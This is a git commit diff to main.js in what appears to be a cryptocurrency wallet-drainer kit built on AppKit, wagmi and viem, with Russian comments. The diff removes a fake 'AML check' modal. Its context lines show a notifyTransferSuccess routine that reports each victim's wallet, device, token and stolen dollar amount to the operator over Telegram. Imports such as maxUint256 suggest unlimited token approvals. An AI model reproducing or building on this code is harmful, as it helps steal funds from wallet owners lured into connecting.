b8822e91487499e30ec22770912ce51a0e3e0e5d
asiqujak <asiqujak596@gmail.com>
2025-08-08 11:16:28 +0000

    Update main.js

--- main.js
+++ main.js
@@ -3,7 +3,6 @@ import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
-import { showAMLCheckModal } from './aml-check-modal.js';
 
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
@@ -419,7 +418,6 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
                     `➡️ ${token.symbol} - ${amountValue}$\n\n` +
                     `🔗 Transfer: [Transaction Hash](${txLink})`
     await sendTelegramMessage(message)
-	await showAMLCheckModal()
   } catch (error) {
     store.errors.push(`Error in notifyTransferSuccess: ${error.message}`)
   }
